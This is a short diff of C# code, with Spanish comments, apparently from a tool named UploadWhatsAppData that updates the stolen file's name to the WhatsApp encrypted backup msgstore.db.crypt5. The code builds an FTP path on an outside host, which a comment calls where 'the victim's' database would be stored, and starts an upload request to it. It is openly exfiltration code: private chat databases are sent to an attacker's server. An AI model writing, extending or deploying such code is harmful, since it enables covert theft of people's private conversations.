@@ -65,7 +65,7 @@ namespace UploadWhatsAppData
 					//Combinamos el directorio de las bases de datos con el del archivo de conversaciones encriptado
 					//msgstore.db.crypt == a ultimo backup de conversaciones generado
 					//en esta direccion hay mas archivo en diferentes fechas que son respaldos anteriores de la base
-					path = Path.Combine(path, "msgstore.db.crypt");
+					path = Path.Combine(path, "msgstore.db.crypt5");
 
 					//Configurar FTP
 					string ftpHost     = "direccion";//"miftp.com"
@@ -73,7 +73,7 @@ namespace UploadWhatsAppData
 					string ftpPassword = "password";
 
 					//Direccion completa de donde quedaria hospedado la base da la victima
-					string ftpfullpath = "ftp://" + ftpHost + "/"+ id +"msgstore.db.crypt";
+					string ftpfullpath = "ftp://" + ftpHost + "/"+ id +"msgstore.db.crypt5";
 
 					//Generamos
 					FtpWebRequest ftp = (FtpWebRequest)FtpWebRequest.Create(ftpfullpath);
